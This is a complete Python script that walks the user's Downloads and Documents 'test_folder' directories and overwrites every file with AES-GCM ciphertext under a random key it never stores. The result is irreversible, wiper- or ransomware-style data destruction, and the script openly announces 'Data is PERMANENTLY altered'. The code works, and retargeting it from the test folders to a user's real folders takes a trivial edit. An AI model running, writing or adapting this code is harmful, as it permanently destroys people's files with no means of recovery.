import os
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


# Function to get current user paths dynamically
def get_current_user_paths():
    # Get the current user's home directory
    home_dir = Path.home()
    current_user = home_dir.parts[-1]  # Extract username from the path

    # Define Downloads and Documents paths
    downloads_path = home_dir / "Downloads" / "test_folder"
    documents_path = home_dir / "Documents" / "test_folder"

    return {
        "user": current_user,
        "downloads": str(downloads_path),
        "documents": str(documents_path)
    }


# Encrypt files with a random key that is NEVER stored
def encrypt_files(target_paths):
    for target_path in target_paths:
        if not os.path.exists(target_path):
            print(f"Skipping: {target_path} does not exist.")
            continue

        for root, _, files in os.walk(target_path):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        data = f.read()

                    # Generate a one-time random key & nonce (NEVER stored)
                    key = get_random_bytes(32)  # 256-bit AES key
                    cipher = AES.new(key, AES.MODE_GCM)
                    ciphertext, tag = cipher.encrypt_and_digest(data)

                    # Overwrite file with encrypted data
                    with open(file_path, "wb") as f:
                        f.write(cipher.nonce + tag + ciphertext)

                    # Overwrite key in memory
                    del key

                    print(f"PERMANENTLY Encrypted: {file_path}")

                except Exception as e:
                    print(f"Error encrypting {file_path}: {e}")


def main():
    paths = get_current_user_paths()
    target_paths = [paths["downloads"], paths["documents"]]

    print(f"Encrypting files for user: {paths['user']}")
    encrypt_files(target_paths)
    print("Encryption COMPLETED! 🔥 Data is PERMANENTLY altered.")


if __name__ == "__main__":
    main()
